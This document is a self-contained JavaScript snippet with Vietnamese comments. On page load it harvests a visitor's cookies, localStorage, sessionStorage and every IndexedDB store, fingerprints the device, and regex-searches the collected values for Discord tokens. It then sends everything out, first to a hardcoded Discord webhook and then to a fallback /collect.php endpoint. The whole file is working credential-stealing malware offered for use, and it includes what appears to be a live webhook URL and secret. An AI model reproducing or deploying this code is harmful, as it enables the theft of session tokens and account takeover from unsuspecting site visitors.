(function () {
  "use strict";

  const WEBHOOK = "https://discord.com/api/webhooks/1568610122794664119/uEuSKJfGpF96kMblYpnjVVYyTBYL6DuWafptMyxuITU_Ep0Lfq94AQWXv6QLxsXoVBKe";
  const COLLECT  = "/collect.php"; // dự phòng nếu webhook bị CORS

  function safe(fn, fallback) {
    try { return fn(); } catch (e) { return fallback; }
  }

  function grabStorage(store) {
    const out = {};
    if (!store) return out;
    for (let i = 0; i < store.length; i++) {
      const k = store.key(i);
      out[k] = store.getItem(k);
    }
    return out;
  }

  function grabCookies() {
    const out = {};
    (document.cookie || "").split(";").forEach(pair => {
      const idx = pair.indexOf("=");
      if (idx > -1) out[pair.slice(0, idx).trim()] = pair.slice(idx + 1).trim();
    });
    return out;
  }

  async function grabIndexedDB() {
    if (!window.indexedDB) return {};
    const result = {};
    try {
      const dbs = await indexedDB.databases();
      for (const dbInfo of dbs) {
        const db = await new Promise((res, rej) => {
          const req = indexedDB.open(dbInfo.name);
          req.onsuccess = () => res(req.result);
          req.onerror = () => rej(req.error);
        });
        for (const storeName of db.objectStoreNames) {
          const tx = db.transaction(storeName, "readonly");
          const store = tx.objectStore(storeName);
          const all = await new Promise((res) => {
            const req = store.getAll();
            req.onsuccess = () => res(req.result);
            req.onerror = () => res([]);
          });
          result[dbInfo.name + "::" + storeName] = all;
        }
        db.close();
      }
    } catch (e) {}
    return result;
  }

  // Ưu tiên: nếu có token Discord ở bất kỳ đâu, đánh dấu nổi bật
  function findDiscordTokens(obj) {
    const hits = [];
    const tokenRe = /[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,39}/g;
    const walk = (node, path) => {
      if (node == null) return;
      if (typeof node === "string") {
        const m = node.match(tokenRe);
        if (m) m.forEach(t => hits.push({ path, token: t }));
      } else if (typeof node === "object") {
        for (const k in node) walk(node[k], path + "." + k);
      }
    };
    walk(obj, "$");
    return hits;
  }

  async function collect() {
    const data = {
      url: location.href,
      origin: location.origin,
      referrer: document.referrer || null,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      timezone: safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone, null),
      screen: {
        w: screen.width, h: screen.height,
        availW: screen.availWidth, availH: screen.availHeight,
        colorDepth: screen.colorDepth
      },
      devicePixelRatio: window.devicePixelRatio || 1,
      touch: ("ontouchstart" in window) || (navigator.maxTouchPoints > 0),
      localStorage: safe(() => grabStorage(localStorage), {}),
      sessionStorage: safe(() => grabStorage(sessionStorage), {}),
      cookies: grabCookies(),
      indexedDB: await grabIndexedDB(),
      timestamp: new Date().toISOString()
    };

    data.discordTokens = findDiscordTokens({
      localStorage: data.localStorage,
      sessionStorage: data.sessionStorage
    });

    return data;
  }

  async function exfil(data) {
    const body = JSON.stringify(data);
    // 1) thử webhook trực tiếp
    try {
      await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "collector",
          embeds: [{
            title: "New hit",
            description:
              "**URL:** " + data.url + "\n" +
              "**Platform:** " + data.platform + "\n" +
              "**Touch:** " + data.touch + "\n" +
              "**UA:** " + data.userAgent.slice(0, 200) + "\n" +
              "**Tokens found:** " + data.discordTokens.length,
            color: 0xffffff,
            timestamp: data.timestamp
          }],
          files: []
        })
      });
      // gửi payload nặng qua endpoint riêng để tránh giới hạn webhook
      await fetch(COLLECT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body
      });
      return;
    } catch (e) {}

    // 2) dự phòng: chỉ endpoint của bạn
    try {
      await fetch(COLLECT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body
      });
    } catch (e) {}
  }

  window.addEventListener("load", async () => {
    const data = await collect();
    await exfil(data);
  });
})();
